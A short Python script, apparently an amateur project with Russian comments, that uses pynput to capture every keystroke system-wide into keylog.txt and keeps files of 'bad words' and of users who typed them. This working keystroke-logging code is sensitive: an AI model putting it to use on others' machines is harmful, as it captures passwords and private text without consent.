from pynput.keyboard import Key, Listener
from threading import Thread
import logging
import time


def read_keylog():
    try:
        f = open("keylog.txt", 'r')
        log = f.readline()
        f.close()
        return log
    except FileNotFoundError:
        f = open("keylog.txt", 'w')
        f.close()
    except ValueError:
        f = open("keylog.txt", 'w')
        f.close()
    except SyntaxError:
        f = open("keylog.txt", 'w')
        f.close()
    return ''


def read_bad_words():
    try:
        f = open('badwords.txt', 'r')
        st = f.readline().rstrip().lower().split(' ')
        f.close()
        return st
    except FileNotFoundError:
        f = open("badwords.txt", 'w')
        f.close()
    except ValueError:
        f = open("badwords.txt", 'w')
        f.close()
    except SyntaxError:
        f = open("badwords.txt", 'w')
        f.close()
    return []


def read_bad_guys_bad_word():
    try:
        f = open('bad_guys_bad_word.txt', 'r')
        st = f.readline().rstrip().split(' ')
        f.close()
        return st
    except FileNotFoundError:
        f = open('bad_guys_bad_word.txt', 'w')
        f.close()
        return []
    except ValueError:
        f = open('bad_guys_bad_word.txt', 'w')
        f.close()
        return []
    except SyntaxError:
        f = open('bad_guys_bad_word.txt', 'w')
        f.close()
        return []


def write_bad_guys_bad_word(bad_guys: list):
    bad_guys_str = ''
    for i in bad_guys:
        bad_guys_str += (i + ' ')
    f = open('bad_guys_bad_word.txt', 'w')
    f.write(bad_guys_str)
    f.close()


#logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    key = str(key)
    f = open("keylog.txt", 'a+')
    key = key[1:len(key) - 1]
    f.write(str(key).lower())
    f.close()


def on_release(key):
    stop = read_stop()
    if stop == True:
        # Stop listener
        return False


def logger():
    try:
        f = open("keylog.txt", 'r')
        f.close()
    except FileNotFoundError:
        f = open("keylog.txt", 'w')
        f.close()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # здесь же обработка


def read_stop():
    f = open('potok.txt', 'r')
    stop = f.readline().strip()
    f.close()
    if stop == '0':
        return False
    elif stop == '1':
        return True

# thread1 = Thread(target=logger)
# thread1.start()
# # Условие заверщения
# thread1.join()
